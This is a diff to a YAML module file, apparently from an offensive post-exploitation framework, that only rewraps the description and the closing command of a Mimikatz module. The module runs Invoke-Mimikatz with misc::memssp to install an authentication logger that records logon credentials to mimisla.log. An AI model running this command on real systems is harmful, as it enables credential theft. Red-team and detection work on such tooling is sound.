@@ -6,7 +6,8 @@ authors:
   - name: Benjamin Delpy
     handle: '@gentilkiwi'
     link: https://twitter.com/gentilkiwi
-description: Runs PowerSploit's Invoke-Mimikatz function to execute misc::memssp to log all authentication events to C:\Windows\System32\mimisla.log.
+description: Runs PowerSploit's Invoke-Mimikatz function to execute misc::memssp
+  to log all authentication events to C:\Windows\System32\mimisla.log.
 software: S0194
 tactics: [TA0004, TA0006]
 techniques: [T1101.005, T1056]
@@ -25,5 +26,5 @@ options:
     required: true
     value: ''
 script_path: credentials/Invoke-Mimikatz.ps1
-script_end: Invoke-Mimikatz -Command '"misc::memssp"'; 'memssp installed, check C:\Windows\System32\mimisla.log for logon
-  events.'
+script_end: Invoke-Mimikatz -Command '"misc::memssp"'; 'memssp installed, check C:\Windows\System32\mimisla.log
+  for logon events.'
